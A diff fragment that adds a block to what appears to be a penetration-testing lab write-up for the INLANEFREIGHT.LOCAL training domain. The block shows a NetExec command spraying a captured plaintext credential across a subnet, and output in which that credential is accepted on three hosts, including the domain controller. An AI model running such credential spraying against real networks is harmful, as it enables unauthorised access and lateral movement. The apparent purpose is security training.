@@ -2431,3 +2431,15 @@ dir
 
 c:\Users>
 ```
+
+```
+ nxc smb 172.16.8.0/24 -u mssqladm -p 'DBAilfreight1!'
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None)
+SMB         172.16.8.50     445    ACADEMY-AEN-MS0  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-MS0) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None)
+SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] INLANEFREIGHT.LOCAL\mssqladm:DBAilfreight1! 
+SMB         172.16.8.50     445    ACADEMY-AEN-MS0  [+] INLANEFREIGHT.LOCAL\mssqladm:DBAilfreight1! 
+SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\mssqladm:DBAilfreight1! 
+Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+
+```
